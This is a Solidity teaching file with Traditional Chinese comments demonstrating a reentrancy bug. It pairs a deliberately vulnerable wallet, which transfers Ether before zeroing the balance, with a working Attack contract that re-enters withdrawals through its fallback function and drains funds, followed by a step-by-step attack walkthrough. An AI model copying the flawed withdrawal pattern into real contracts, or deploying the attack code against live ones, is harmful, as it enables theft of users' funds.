/* SPDX-License-Identifier: UNLICENSED */
pragma solidity >=0.8.0;

// VulnerableWallet 合約存在 Unsafe Credit Transfer 漏洞，因為在轉帳前沒有先更新狀態變數，可能遭到重入攻擊。
contract VulnerableWallet {
    // 儲存用戶餘額 (漏洞關鍵：狀態變數的更新順序不當)
    mapping(address => uint256) public userBalances;

    // 允許用戶充值 Ether
    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
    }

    // 提款函式 - 漏洞點：先執行 Ether 轉移，再更新狀態
    function withdrawBalance() public {
        uint256 amountToWithdraw = userBalances[msg.sender];
        require(amountToWithdraw > 0, "No balance to withdraw");
        
        // 漏洞關鍵：外部呼叫發生在狀態更新之前，可能遭到重入攻擊
        (bool success, ) = msg.sender.call{value: amountToWithdraw}("");
        require(success, "Transfer failed");
        
        // 狀態更新晚於外部呼叫，攻擊者可能在此呼叫中重複提款
        userBalances[msg.sender] = 0;
    }

    // 為正確接收 Ether，建議同時定義 receive 與 fallback 函式
    receive() external payable {}
    fallback() external payable {}
}

// 攻擊合約，用於展示如何利用 VulnerableWallet 的重入漏洞
contract Attack {
    // 修改構造子參數型態為 address payable (符合 VulnerableWallet 需要可支付地址)
    VulnerableWallet public vulnerableWallet;
    address public owner;
    uint256 public count;

    // 請注意：參數型態從 address 改為 address payable，避免顯式類型轉換錯誤
    constructor(address payable _vulnerableWalletAddress) {
        vulnerableWallet = VulnerableWallet(_vulnerableWalletAddress);
        owner = msg.sender;
    }

    // 攻擊入口，先充值後發起提款，進而觸發重入
    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        // 將攻擊合約注入一些 Ether到目標合約
        vulnerableWallet.deposit{value: msg.value}();
        // 發起第一次提款，進入重入循環
        vulnerableWallet.withdrawBalance();
    }

    // fallback 函式：當 VulnerableWallet 轉帳時被呼叫，並進行重入攻擊
    fallback() external payable {
        // 為避免無限循環，這裡限制重入次數
        if (count < 2) {
            count++;
            // 再次呼叫 withdrawBalance() 進行重入，拿走更多資產
            vulnerableWallet.withdrawBalance();
        }
    }

    // 提取攻擊合約中累積的 Ether
    function collectEther() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

/*
攻擊流程說明 (繁體中文)：
1. 部署 VulnerableWallet 合約。
2. 部署 Attack 合約，並傳入 VulnerableWallet 的地址（需為 payable address）。
3. 呼叫 Attack 的 attack() 函式，同時附帶 Ether，讓 VulnerableWallet 建立對應的餘額記錄。
4. Attack 合約在執行 withdrawBalance() 時，由於先執行 Ether 轉移、後更新餘額，攻擊合約在 fallback() 期間可以重入多次，從而連續提款。
5. 結果，攻擊者能夠提取超過原始餘額的資金，造成資金流失。
*/